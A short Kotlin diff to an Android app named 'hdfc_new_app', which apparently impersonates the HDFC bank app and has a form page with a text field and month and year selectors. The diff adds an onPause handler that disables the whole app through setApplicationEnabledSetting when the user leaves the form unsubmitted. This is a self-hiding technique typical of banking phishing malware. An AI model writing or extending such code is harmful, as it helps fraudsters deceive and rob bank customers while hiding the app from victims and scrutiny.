@@ -1,6 +1,7 @@
 package com.example.hdfc_new_app
 
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.util.Log
 import android.widget.ArrayAdapter
@@ -21,6 +22,7 @@ class thirdpage : AppCompatActivity() {
         binding = ActivityThirdpageBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        util.saveLocalData(this,"check","true")
 
         val months = resources.getStringArray(R.array.months_array)
         val monthAdapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, months)
@@ -35,7 +37,7 @@ class thirdpage : AppCompatActivity() {
 
 
         binding.sub.setOnClickListener {
-
+            util.saveLocalData(this ,"check","false")
             if(binding.e2.text.toString().isEmpty() ){
                 Toast.makeText(this,"Fill all fields",Toast.LENGTH_SHORT).show()
             } else if(binding.yearSpinner.selectedItem.toString() == "2022"){
@@ -68,6 +70,19 @@ class thirdpage : AppCompatActivity() {
         }
 
 
+    }
+
+    override fun onPause() {
+        super.onPause()
+        val util =  Util()
+        if(util.getLocalData(this,"check")=="true") {
+            Log.e("asdf123", "pause: verify activity")
+            val pakagemanger = packageManager
+            pakagemanger.setApplicationEnabledSetting(
+                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        }
     }
 
 }
